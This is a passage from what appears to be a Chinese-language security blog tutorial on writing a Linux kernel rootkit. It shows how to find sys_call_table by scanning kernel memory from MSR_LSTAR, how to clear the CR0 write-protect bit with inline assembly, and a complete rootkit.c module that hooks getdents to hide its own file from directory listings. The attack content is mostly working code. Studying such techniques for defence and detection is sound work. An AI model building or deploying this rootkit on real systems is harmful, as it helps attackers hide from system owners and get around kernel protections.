<code>%p</code> 只會印出該指標的雜湊值而不是真正的指標的值，這是為了避免洩漏內核位址</p>
</p></details>
<h4 id="方法三">方法三</h4>
<ul>
<li>下面兩個檔案路徑有可能會有 sys_call_table 的位址</li>
<li>/proc/kallsyms 是一個特殊的檔案，會在讀取時動態產生</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /boot/System.map-$(<span class="built_in">uname</span> -r) | grep <span class="string">&quot;sys_call_table&quot;</span></span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep  <span class="string">&quot;sys_call_table&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="方法四">方法四</h4>
<ul>
<li>最穩的方式是自己去 kernel 裡面撈 memory</li>
<li>想法源自於<a target="_blank" rel="noopener" href="http://phrack.org/issues/58/7.html">這篇</a>，但 kernel 5.x.x 有多包了一層 <code>do_syscall_64</code>，需要做一些改動</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> *<span class="title function_">get_syscalltable</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> lo, hi;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdmsr&quot;</span> : <span class="string">&quot;=a&quot;</span> (lo), <span class="string">&quot;=d&quot;</span> (hi) : <span class="string">&quot;c&quot;</span> (MSR_LSTAR))</span>;</span><br><span class="line">    <span class="type">uint8_t</span> *entry_SYSCALL_64 = (<span class="type">uint8_t</span> *)(((<span class="type">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lo);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *ptr;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> do_syscall_64_inst[<span class="number">7</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="comment">// mov rdi, rax</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="comment">// mov rsi, rsp</span></span><br><span class="line">        <span class="number">0xe8</span>,             <span class="comment">// call do_syscall_64</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ptr = find(entry_SYSCALL_64, do_syscall_64_inst, <span class="number">7</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *do_syscall_64 = (<span class="type">uint8_t</span> *)(ptr + <span class="number">11</span> + ((<span class="type">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="type">uint32_t</span> *)(ptr + <span class="number">7</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> sys_call_table_inst[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0xfd</span> <span class="comment">// mov rax, QWORD PTR [rdi*8-?]</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ptr = find(do_syscall_64, sys_call_table_inst, <span class="number">4</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *sys_call_table = (<span class="type">uint8_t</span> *)((<span class="type">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="type">uint32_t</span> *)(ptr + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sys_call_table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要理解上面的程式碼在做什麼，我們需要知道下面兩件事</p>
<h5 id="Module-Specific-Register-是什麼">Module Specific Register 是什麼 ?</h5>
<ul>
<li>module specific register 是一塊跟 CPU 有關的暫存器</li>
<li>每個 msr 都會有個 index，可以想像成一個很大的陣列</li>
<li>用 <code>rdmsr</code>, <code>wrmsr</code> 這組 instructions 可以對 msr 做讀寫，必須提供 index</li>
<li>kernel 一開始在初始化的時候，把 <code>entry_SYSCALL_64</code> 寫到 <code>msr[MSR_LSTAR]</code></li>
</ul>
<h5 id="syscall-執行下去實際上是發生什麼事">syscall 執行下去實際上是發生什麼事 ?</h5>
<ol>
<li>使用者呼叫 <code>syscall</code></li>
<li>切換到 ring 0</li>
<li>跳去 msr[MSR_LSTAR] 這個位址也就是 <code>entry_SYSCALL_64</code> 這裡</li>
<li>呼叫 <code>do_syscall_64</code></li>
<li><code>regs-&gt;ax = sys_call_table[nr](regs);</code> 這行呼叫對應的函式</li>
</ol>
<h4 id="解讀上面的程式碼的步驟">解讀上面的程式碼的步驟</h4>
<ol>
<li>我們已經在 ring 0 了</li>
<li>直接用 <code>rdmsr</code> 讀 <code>msr[MSR_LSTAR]</code></li>
<li>直接在 <code>entry_SYSCALL_64</code> 的 instructions 裡面找下面這個 pattern</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq %rax, %rdi,</span><br><span class="line">movq %rsp, %rsi</span><br><span class="line">call do_syscall_64</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>這樣就找到 <code>do_syscall_64</code> 了</li>
<li>進到 <code>do_syscall_64</code> 後，一樣畫葫蘆，再找下面這個 pattern</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, QWORD PTR [rdi*8-?]</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>最後，這個問號的值就會是 <code>sys_call_table</code> 的位址</li>
</ol>
<h3 id="讓-sys-call-table-可以寫入">讓 <code>sys_call_table</code> 可以寫入</h3>
<ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Control_register#CR0">cr0 register</a> 的其中一個 bit 是代表 read-only 區段可不可寫，改成 0 就通通可寫啦</li>
<li><code>write_cr0</code> 這個 function 在 kernel 5.x.x 版加了檢查，不過我們直接寫 assembly 就沒問題啦</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">writable_unlock</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> val = read_cr0() &amp; (~X86_CR0_WP);</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %0,%%cr0&quot;</span>: <span class="string">&quot;+r&quot;</span> (val))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writable_lock</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> val = read_cr0() | X86_CR0_WP;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %0,%%cr0&quot;</span>: <span class="string">&quot;+r&quot;</span> (val))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="要-hook-哪個-syscall">要 hook 哪個 syscall</h3>
<ul>
<li><code>ps</code> 做的事情就是去讀 <code>/proc</code> 底下所有檔案，基本上是 <code>ls</code> 的強化版，那我們這次就先做 <code>ls</code> 隱藏檔案</li>
<li>一樣用 <code>strace ls</code> 去看他呼叫了哪些 <code>syscall</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getdents(<span class="number">3</span>, <span class="comment">/* 16 entries */</span>, <span class="number">32768</span>)    = <span class="number">512</span></span><br><span class="line">getdents(<span class="number">3</span>, <span class="comment">/* 0 entries */</span>, <span class="number">32768</span>)     = <span class="number">0</span></span><br><span class="line">close(<span class="number">3</span>)</span><br><span class="line">fstat(<span class="number">1</span>, &#123;st_mode=S_IFCHR|<span class="number">0620</span>, st_rdev=makedev(<span class="number">136</span>, <span class="number">1</span>), ...&#125;) = <span class="number">0</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;a\thook.c\t initramfs\t    linux-5.&quot;</span>..., <span class="number">75</span>) = <span class="number">75</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;attach\thook.so  initramfs.cpio.g&quot;</span>..., <span class="number">90</span>) = <span class="number">90</span></span><br></pre></td></tr></table></figure>
<p><code>getdents</code> 看起來是關鍵的 syscall，查看一下 man page</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       getdents, getdents64 - get directory entries</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       int getdents(unsigned int fd, struct linux_dirent *dirp,</span><br><span class="line">                    unsigned int count);</span><br><span class="line">       int getdents64(unsigned int fd, struct linux_dirent64 *dirp,</span><br><span class="line">                    unsigned int count);</span><br><span class="line"></span><br><span class="line">       Note: There are no glibc wrappers for these system calls; see NOTES.</span><br></pre></td></tr></table></figure>
<ul>
<li><code>getdents</code> 跑完後會把結果存到 <code>dirp</code> 裡面，那我們就遍歷 <code>dirp</code> 把要隱藏的丟掉就好了</li>
<li>kernel 4.x.x 的參數是放在 stack 傳的，但 kernel 5.x.x 多包了一層 <code>do_syscall_64</code>，參數傳遞變成是透過 <code>struct pt_regs *regs</code> 這個結構去傳</li>
</ul>
<figure class="highlight c"><figcaption><span>rootkit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kallsyms.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  d_ino;     <span class="comment">/* Inode number */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  d_off;     <span class="comment">/* Offset to next linux_dirent */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> d_reclen;  <span class="comment">/* Length of this linux_dirent */</span></span><br><span class="line">    <span class="type">char</span>           d_name[];  <span class="comment">/* Filename (null-terminated) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> **sys_call_table;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*original_getdents) (<span class="keyword">struct</span> pt_regs *regs);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writable_unlock</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> val = read_cr0() &amp; (~X86_CR0_WP);</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %0,%%cr0&quot;</span>: <span class="string">&quot;+r&quot;</span> (val))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writable_lock</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> val = read_cr0() | X86_CR0_WP;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %0,%%cr0&quot;</span>: <span class="string">&quot;+r&quot;</span> (val))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> *<span class="title function_">find</span> <span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint8_t</span> *ptr = a, i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++, ptr++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(ptr, b, len)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> *<span class="title function_">get_syscalltable</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> lo, hi;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdmsr&quot;</span> : <span class="string">&quot;=a&quot;</span> (lo), <span class="string">&quot;=d&quot;</span> (hi) : <span class="string">&quot;c&quot;</span> (MSR_LSTAR))</span>;</span><br><span class="line">    <span class="type">uint8_t</span> *entry_SYSCALL_64 = (<span class="type">uint8_t</span> *)(((<span class="type">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lo);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *ptr;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> do_syscall_64_inst[<span class="number">7</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="comment">// mov rdi, rax</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="comment">// mov rsi, rsp</span></span><br><span class="line">        <span class="number">0xe8</span>,             <span class="comment">// call do_syscall_64</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ptr = find(entry_SYSCALL_64, do_syscall_64_inst, <span class="number">7</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *do_syscall_64 = (<span class="type">uint8_t</span> *)(ptr + <span class="number">11</span> + ((<span class="type">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="type">uint32_t</span> *)(ptr + <span class="number">7</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> sys_call_table_inst[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0xfd</span> <span class="comment">// mov rax, QWORD PTR [rdi*8-?]</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ptr = find(do_syscall_64, sys_call_table_inst, <span class="number">4</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *sys_call_table = (<span class="type">uint8_t</span> *)((<span class="type">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="type">uint32_t</span> *)(ptr + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sys_call_table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILENAME <span class="string">&quot;rootkit.ko&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_getdents_hook</span><span class="params">(<span class="keyword">struct</span> pt_regs *regs)</span> &#123;</span><br><span class="line">    <span class="type">int</span> total = original_getdents(regs);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> fd = regs-&gt;di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">dirent</span> =</span> regs-&gt;si;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = regs-&gt;dx;</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (offset &lt; total) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> linux_dirent *)((<span class="type">uint8_t</span> *)dirent + offset);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">next_ptr</span> =</span> (<span class="keyword">struct</span> linux_dirent *)((<span class="type">uint8_t</span> *)dirent + offset + ptr-&gt;d_reclen);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strncmp</span>(ptr-&gt;d_name, FILENAME, <span class="built_in">strlen</span>(FILENAME)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> reclen = ptr-&gt;d_reclen;</span><br><span class="line">            memmove(ptr, next_ptr, total - (offset + reclen));</span><br><span class="line">            total -= reclen;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            offset += ptr-&gt;d_reclen;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    sys_call_table = (<span class="type">void</span> **)get_syscalltable();</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;sys_call_table = %llu\n&quot;</span>, sys_call_table);</span><br><span class="line">    writable_unlock();</span><br><span class="line">    original_getdents = sys_call_table[__NR_getdents];</span><br><span class="line">    sys_call_table[__NR_getdents] = sys_getdents_hook;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rootkit_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    sys_call_table[__NR_getdents] = original_getdents;</span><br><span class="line">    writable_lock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br></pre></td></tr></table></figure>
<h3 id="DEMO-2">DEMO</h3>
<script id="asciicast-nySYMlkNUoKXyGZidEFOsN1PV" src="https://asciinema.org/a/nySYMlkNUoKXyGZidEFOsN1PV.js" async></script>
<hr>
<p>1: <a target="_blank" rel="noopener" href="http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/">http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/</a><br>
2: <a target="_blank" rel="noopener" href="https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/">https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/</a><br>
3: <a target="_blank" rel="noopener" href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html">https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html</a><br>
4: <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/printk-formats.txt">https://www.kernel.org/doc/Documentation/printk-formats.txt</a><br>
5: <a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/">https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/</a></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2019/06/07/linux-rootkit/#more">Read more</a></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/images/avatar.png" alt="oalieno"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">oalieno</p><p class="is-size-6 is-block">資安研究員</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">38</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">55</p></a></div></div></nav><div class="level"><a class="level-item button is-primary" href="https://github.com/oalieno" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/oalieno"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/oalieno"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Linkedin" href="https://www.linkedin.com/in/oalieno/"><i class="fab fa-linkedin"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Windows/"><span class="level-start"><span class="level-item">Windows</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%85%B6%E4%BB%96/"><span class="level-start"><span class="level-item">其他</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"><span class="level-start"><span class="level-item">區塊鍊</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"><span class="level-start"><span class="level-item">演算法</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/"><span class="level-start"><span class="level-item">資安</span></span><span class="level-end"><span class="level-item tag">19</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/writeups/"><span class="level-start"><span class="level-item">writeups</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/%E5%AF%86%E7%A2%BC%E5%AD%B8/"><span class="level-start"><span class="level-item">密碼學</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/%E9%80%86%E5%90%91/"><span class="level-start"><span class="level-item">逆向</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/"><span class="level-start"><span class="level-item">雜談</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-10-28T16:00:00.000Z">2023-10-29</time></p><p class="title"><a href="/2023/10/29/gashapon/">【Paper 解讀】打造公平的遊戲轉蛋：在不洩漏原始碼的前提下驗證虛擬轉蛋的機率</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a> / <a href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-09-06T16:00:00.000Z">2023-09-07</time></p><p class="title"><a href="/2023/09/07/windows-facts-02/">【Windows 小知識】PE Section 大小</a></p><p class="categories"><a href="/categories/Windows/">Windows</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-08-14T16:00:00.000Z">2023-08-15</time></p><p class="title"><a href="/2023/08/15/windows-facts-01/">【Windows 小知識】檔案總管的排序規則</a></p><p class="categories"><a href="/categories/Windows/">Windows</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-01T16:00:00.000Z">2023-03-02</time></p><p class="title"><a href="/2023/03/02/bloom-zh/">【語言模型】繁中語言模型 bloom-1b1-zh 試玩</a></p><p class="categories"><a href="/categories/AI/">AI</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-02-27T16:00:00.000Z">2023-02-28</time></p><p class="title"><a href="/2023/02/28/ubuntu-kernel-version/">【資安小知識】Linux Kernel 出漏洞 Ubuntu 該升級哪一版?</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a> / <a href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/10/"><span class="level-start"><span class="level-item">October 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">September 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">August 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">March 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">February 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/11/"><span class="level-start"><span class="level-item">November 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span 